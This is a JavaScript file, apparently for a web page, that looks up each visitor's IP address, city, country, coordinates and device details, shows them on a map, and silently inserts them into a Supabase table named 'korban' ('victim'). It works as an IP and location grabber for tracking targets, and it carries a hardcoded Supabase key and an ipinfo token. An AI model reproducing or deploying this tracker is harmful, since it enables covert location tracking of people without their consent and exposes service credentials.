import { createClient } from 'https://esm.sh/@supabase/supabase-js'

const supabase = createClient(
  'https://ldxmkrwegqlyakffxzif.supabase.co', // ganti ini
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeG1rcndlZ3FseWFrZmZ4emlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU2NDAyMzcsImV4cCI6MjA2MTIxNjIzN30.7nY7oKtA457JxuQllX2UwREBH41bByWcbGp_L05K28I'                    // dan ini
)

// Tampilkan info perangkat
const deviceInfo = document.getElementById("deviceInfo")
deviceInfo.innerHTML = `
  <strong>User Agent:</strong> ${navigator.userAgent}<br>
  <strong>Platform:</strong> ${navigator.platform}<br>
  <strong>Resolusi Layar:</strong> ${window.screen.width} x ${window.screen.height}
`

fetch("https://ipinfo.io/json?token=8f8f1f3820adfb")
  .then((res) => res.json())
  .then(async (data) => {
    document.getElementById("ipInfo").innerHTML = `
      <strong>IP Address:</strong> ${data.ip}<br>
      <strong>Kota:</strong> ${data.city}<br>
      <strong>Negara:</strong> ${data.country}<br>
      <strong>Lokasi (koordinat):</strong> ${data.loc}
    `

    const [lat, lon] = data.loc.split(",")
    const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`
    document.getElementById("mapFrame").src = mapUrl

    // Kirim ke Supabase
    await supabase.from("korban").insert([{
      ip: data.ip,
      city: data.city,
      country: data.country,
      loc: data.loc,
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      resolution: `${window.screen.width} x ${window.screen.height}`,
      maps_link: `https://maps.google.com/maps?q=${lat},${lon}&z=15`
    }])
  })
  .catch(() => {
    document.getElementById("ipInfo").innerHTML = "Gagal mengambil info IP."
  })
